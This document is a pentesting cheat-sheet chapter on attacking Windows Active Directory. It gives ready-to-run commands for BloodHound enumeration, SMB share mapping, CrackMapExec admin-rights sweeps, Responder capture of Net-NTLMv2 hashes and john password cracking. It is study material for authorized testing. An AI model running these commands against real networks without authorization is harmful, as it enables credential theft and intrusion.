# Active Directory & Windows Machines {-}

## Interesting Windows ports {-}

- 88 Kerberos
- 139 NetBIOS session service
- 445 Server Message Block **SMB**
- 389 LDAP
- 1433 ms-sql
- 5985-5986 WinRM

> [!] NOTE: NetBIOS session service facilitates authentication aross a windows workgroup or domain and provides access to resources (such as files and printers) 

## Active Directory Enumeration {-}

As soon as we see port 88 and 389 or if victime machine changed the port number and we see Kerberos and LDAP, Attacker can estimate that the 
victim machine is a Domain Controller.

If we already have credentials, we can enumerate the Active Directory with the bloodhound package

1. Install bloodhound injester
    
    ```bash
    python -m venv venv
    source venv/bin/activate
    pip install bloodhound
    ```

1. Run enumeration

    ```bash
    bloodhound-python -d victim.local -u username -p "Password" -gc machine.victim.local -c all -ns 10.10.10.11
    ```

1. New json files have been created in your working directory

    ```bash
    ls -la *.json
    ```

1. Install bloodhound and neo4j

    ```bash
    sudo apt install neo4j bloodhound
    ```

1. configure neo4j service

    ```bash
    sudo neo4j console
    ```


## Map SAMBA exposed shared resources with smbmap {-}

```bash
smbmap -H 10.10.10.10 -u " " -p " "
```

## SMB connection with smbclient {-}

```bash
smbclient //10.10.10.10/<READ ONLY Desired resource>
```

> [!] NOTE: smbclient don't provide you a shell but a tool. **get filename.txt** allows you to download a resource if you are connected


## Enumerate machines by SAMBA with crackmapexec {-}

**CrackMapExec** (a.k.a **CME**) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.

```bash
cme smb 192.168.0.0/24
```

If we have credentials of a user, and this one have admin priviledges on machines, You can use **CrackMapExec** to check those priviledges.
If it's the case, you will see a (Pwn3d!) in the result.

```bash
cme smb 192.168.0.0/24 -u 'user' -p 'password1'
```


## Sniffing traffic for SAMBA Relay with responder {-}

When SAMBA is created, by default SAMBA cert is not signed. That means that by default it's not possible to validate the origin legitimity. 
In this case Attacker can use tools like responder in order to sniff SAMBA communication traffic.

```bash
cd /usr/share/responder
# config file is in Responder.conf
python3 Responder.py -I eth0 -rdw
```

As soon as a connection is launched, you can see the communication. And because the SAMBA is not signed you can then get the **Hash Net-NTLMv2** of the user.

```{r, echo = FALSE, fig.cap="Hash Net-NTLMv2 Sniffing", out.width="90%"}
knitr::include_graphics("images/ad-hashnetntlmv2.png")
```

What attacker can do with this hash?

1. copy hashes in a file (*hashes*)
1. bruteforce hashes file with john
    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt hashes
    ```
